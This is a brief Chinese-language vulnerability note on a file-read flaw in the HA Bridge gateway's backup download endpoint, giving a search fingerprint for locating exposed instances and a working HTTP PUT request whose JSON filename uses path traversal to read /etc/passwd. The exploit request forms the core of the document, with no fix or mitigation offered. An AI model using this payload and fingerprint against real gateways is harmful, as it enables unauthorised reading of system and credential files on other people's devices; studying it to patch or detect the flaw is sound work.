# hi-bridge网关download存在文件读取漏洞

# 一、漏洞简介
hi-bridge网关download存在文件读取漏洞

# 二、影响版本
+ hi-bridge网关

# 三、资产测绘
```plain
title="HA Bridge"
```

![1716312169799-4fd5856c-56e1-426d-a253-9230ae522398.png](./img/qezHCxCNYkbHMxcn/1716312169799-4fd5856c-56e1-426d-a253-9230ae522398-746647.png)

# 四、漏洞复现
```plain
PUT /api/devices/backup/download HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 


{"filename":"../../../../etc/passwd"}
```

![1716312291501-52489ea0-9fd1-4509-bf55-917a14eaf026.png](./img/qezHCxCNYkbHMxcn/1716312291501-52489ea0-9fd1-4509-bf55-917a14eaf026-796584.png)



> 更新: 2024-05-23 12:38:07  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/aat3gchwm23g4rhd>